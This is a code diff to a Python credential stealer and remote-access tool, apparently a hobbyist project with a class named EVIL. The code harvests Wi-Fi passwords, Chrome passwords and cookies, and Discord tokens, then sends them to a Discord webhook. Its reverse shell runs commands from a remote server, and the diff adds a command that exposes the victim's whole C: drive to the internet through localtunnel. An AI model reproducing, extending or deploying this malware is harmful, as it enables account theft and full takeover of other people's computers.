@@ -23,9 +23,9 @@ from cryptography.hazmat.backends import default_backend
 from cryptography.hazmat.primitives.ciphers import (Cipher, algorithms, modes)
 
 class VARIABLES:
-    webhook    = "" # your discord webhook
+    webhook    = "YOUR-WEBHOOK" # your discord webhook
     printOnEnd = False # True = don't print endText when program finished - False = don't print
-    endText    = "PROGRAM FINISHED" # change this to whatever you want to print when the program finishes
+    endText    = "PROGRAM FINISEHD" # change this to whatever you want to print when the program finishes
 
     """ If you don't have any clue what you're doing - keep REVSHELL False """
     REVSHELL  = False # False = dont connect to your shell - True = try to connect to your shell
@@ -215,6 +215,7 @@ class EVIL:
 
             def DecryptData(self, data, key):
                 try:
+                    from Crypto.Cipher import AES
                     iv = data[3:15]
                     data = data[15:]
                     cipher = AES.new(key, AES.MODE_GCM, iv)
@@ -266,7 +267,7 @@ class EVIL:
             """ Scrape local & browser Discord tokens """
             def __init__(self):
                 self.tokens = []
-                self.rawtokens = []
+                self.rawtokens = ""
                 self.tokeninfo = ""
 
             def GetTokens(self) -> None:
@@ -308,7 +309,7 @@ class EVIL:
                                         for token in re.findall(regex, line):
                                             if token + " - " + platform not in self.tokens:
                                                 self.tokens.append(token + " -> " + platform)
-                                                self.rawtokens.append(token)
+                                                self.rawtokens += f"\n{token}\n"
                 return self.tokens
 
             def Main(self):
@@ -323,6 +324,7 @@ class EVIL:
                 return LOGGER.UploadFile(randomfilename, filename="Token File"), self.rawtokens
 
             def Valid(self, token):
+                """ Currently not used """
                 headers = { 'Authorization': token, 'Content-Type': 'application/json' }
                 r = get('https://discordapp.com/api/v9/users/@me', headers=headers)
                 return True if r.status_code == 200 else False
@@ -330,7 +332,6 @@ class EVIL:
 
         def Main(self):
             """ Get information and construct embed """
-            """ Current error: token validation not working """
             WifiPass   = self.GetWifiPasswords()
             ChromePass = self.GetChromePasswords()
             ChromeCks  = self.GetChromeCookies()
@@ -340,11 +341,6 @@ class EVIL:
             chrome_cookies   = ChromeCks.Main()
             discord_tokens   = DiscTokens.Main()
 
-            working, bad = "", ""
-            for token in discord_tokens[1]:
-                if DiscTokens.Valid(token): working += f"{token}\n"
-                else: bad += f"{token}\n"
-
             system_info = ""
             for key in self.INFO:
                 system_info += f"{key} : {self.INFO[key]}\n"
@@ -353,12 +349,8 @@ class EVIL:
                 "color": 0x000000,
                         "fields": [
                             {
-                                "name": "**Valid Tokens (current)**",
-                                "value": f"```{'No Valid Tokens :(' if working == '' else working}```"
-                            },
-                            {
-                                "name": "**Invalid Tokens (old)**",
-                                "value": f"```{'No Invalid Tokens :)' if bad == '' else bad}```"
+                                "name": "**Tokens**",
+                                "value": f"```{discord_tokens[1]}```"
                             },
                             {
                                 "name": "System Information",
@@ -422,6 +414,7 @@ class EVIL:
             req = post(VARIABLES.webhook, headers={"content-type": "application/json"}, data=json.dumps(heading).encode())
 
         def Main(self):
+            """ currently working on the localtunnel function and getting the tunnel link automatically... """
             s = sock.socket()
             s.connect((VARIABLES.serverip, VARIABLES.port))
             s.send(self.cwd.encode())
@@ -430,12 +423,20 @@ class EVIL:
             while True:
                 try:
                     command = s.recv(VARIABLES.buffer).decode()
-                    splited_command = command.split()
-                    if command.lower() == "exit":
+                    split_command = command.split()
+                    if split_command[0] == "localtunnel":
+                        try:
+                            tunnel_port = split_command[1]
+                            tunnel_inst = sp.getoutput("npm install -g localtunnel")
+                            tunnel_link = sp.getoutput(f"lt --port {tunnel_port}")
+                            http_server = sp.getoutput(f"python -m http.server --directory C:// {tunnel_port}")
+                            output = f"[*] Started localtunnel @ {tunnel_link}"
+                        except Exception as error:
+                            output = "[!] Couldn't start localtunnel: ", error
+                    elif command.lower() == "exit":
                         break
                     else:
                         output = sp.getoutput(command)
-                    self.cwd = os.getcwd()
                     message = f"{output}\n"
                     s.send(message.encode())
                 except Exception as error:
